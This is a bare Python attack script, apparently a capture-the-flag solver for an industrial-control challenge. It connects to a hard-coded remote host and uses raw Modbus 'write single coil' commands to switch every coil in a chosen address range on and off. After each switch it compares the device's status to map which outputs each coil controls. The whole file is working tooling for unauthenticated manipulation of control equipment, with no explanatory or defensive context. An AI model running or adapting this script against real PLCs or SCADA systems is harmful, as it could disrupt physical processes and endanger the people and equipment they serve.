#!/usr/bin/env python3
import socket
import json
import re
import sys
HOST="83.136.253.5"
PORT=53558

def recv_all(sock, timeout=1.0):
    sock.settimeout(timeout)
    chunks=[]
    try:
        while True:
            data=sock.recv(4096)
            if not data:
                break
            chunks.append(data)
    except (socket.timeout, ConnectionResetError):
        pass
    return b"".join(chunks)

def fetch_status():
    s=socket.create_connection((HOST,PORT))
    banner=s.recv(4096)
    s.sendall(b"1")
    data=recv_all(s)
    s.close()
    text=(banner+data).decode(errors="ignore")
    match=re.search(r"(\{.*\})", text)
    if not match:
        raise RuntimeError("No JSON in status")
    return json.loads(match.group(1))

def send_modbus(cmd_hex):
    s=socket.create_connection((HOST,PORT))
    s.recv(4096)
    s.sendall(b"2\n")
    s.recv(4096)
    s.sendall(cmd_hex.encode()+b"\n")
    recv_all(s)
    s.close()

def write_coil(addr, value):
    value_bytes="FF00" if value else "0000"
    cmd=f"5205{addr:04X}{value_bytes}"
    send_modbus(cmd)

def main(start, end):
    base=fetch_status()
    for addr in range(start, end+1):
        write_coil(addr, 1)
        after=fetch_status()
        changes={k:(base.get(k), after.get(k)) for k in sorted(after) if after.get(k)!=base.get(k)}
        print(f"Address {addr}: {changes}")
        write_coil(addr, 0)
        base=fetch_status()
if __name__=="__main__":
    if len(sys.argv)!=3:
        print(f"Usage: {sys.argv[0]} START END")
        sys.exit(1)
    main(int(sys.argv[1]), int(sys.argv[2]))
